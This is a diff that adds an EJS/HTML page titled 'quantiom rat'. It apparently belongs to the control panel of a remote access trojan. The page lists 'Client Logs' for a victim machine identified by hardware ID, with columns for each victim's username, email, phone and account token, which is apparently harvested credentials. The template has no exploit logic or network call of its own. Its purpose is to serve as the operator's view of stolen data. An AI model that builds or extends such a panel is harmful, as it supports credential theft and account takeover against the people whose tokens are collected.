@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <title>quantiom rat</title>
+        <link href="../../bootstrap/bootstrap.min.css" rel="stylesheet" />
+        <link
+            rel="stylesheet"
+            type="text/css"
+            href="https://cdn.datatables.net/v/bs/dt-1.10.21/rg-1.1.2/rr-1.2.7/sc-2.0.2/sp-1.1.1/datatables.min.css"
+        />
+        <link href="../../bootstrap/cover.css" rel="stylesheet" />
+        <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" rel="stylesheet" />
+        <script src="/socket.io/socket.io.js"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+        <link href="../../css/style.css" rel="stylesheet" />
+        <script type="text/javascript">
+            $(document).ready(function () {
+                $('body').tooltip({ selector: '[data-toggle=tooltip]' });
+
+                $('#logTable').DataTable();
+            });
+        </script>
+        <style type="text/css">
+            :root #content > #right > .dose > .dosesingle,
+            :root #content > #center > .dose > .dosesingle {
+                display: none !important;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="site-wrapper">
+            <div class="site-wrapper-inner">
+                <div style="margin-right: 25%; margin-left: 25%">
+                    <div class="inner cover">
+                        <div class="container h-100">
+                            <div class="row h-85 justify-content-center align-items-center"></div>
+                            <div class="container-fluid" style="margin-top: 80px">
+                                <!-- Start -->
+                                <h1><a style="font-size: 36px" href="#" onclick="window.history.back()">«</a> Client Logs</h1>
+                                <p style="color: rgb(180, 180, 180)">Showing recent logs for <%= hwid %>.</p>
+                                <!-- End of Start -->
+                            </div>
+                        </div>
+                    </div>
+                    <br />
+                    <table id="logTable" class="table table-striped">
+                        <thead>
+                            <tr>
+                                <th scope="col">ID</th>
+                                <th scope="col">Date</th>
+                                <th scope="col">User</th>
+                                <th scope="col">Email</th>
+                                <th scope="col">Phone</th>
+                                <th scope="col">Token</th>
+                            </tr>
+                        </thead>
+                        <tbody id="logTableBody">
+                            <% tableData.forEach(entry => { %>
+                            <tr>
+                                <td><%= entry.id %></td>
+                                <td><%= entry.date %></td>
+                                <td><%= entry.user %></td>
+                                <td><%= entry.email %></td>
+                                <td><%= entry.phone %></td>
+                                <td><%= entry.token %></td>
+                            </tr>
+                            <% }) %>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <script>
+            window.jQuery || document.write('<script src="../../../assets/js/vendor/jquery.min.js"><\/script>');
+        </script>
+        <script
+            src="../../bootstrap/tether.min.js.download"
+            integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb"
+            crossorigin="anonymous"
+        ></script>
+        <script src="../../bootstrap/bootstrap.min.js.download"></script>
+        <script src="../../bootstrap/ie10-viewport-bug-workaround.js.download"></script>
+        <script
+            type="text/javascript"
+            src="https://cdn.datatables.net/v/bs/dt-1.10.21/rg-1.1.2/rr-1.2.7/sc-2.0.2/sp-1.1.1/datatables.min.js"
+        ></script>
+    </body>
+</html>
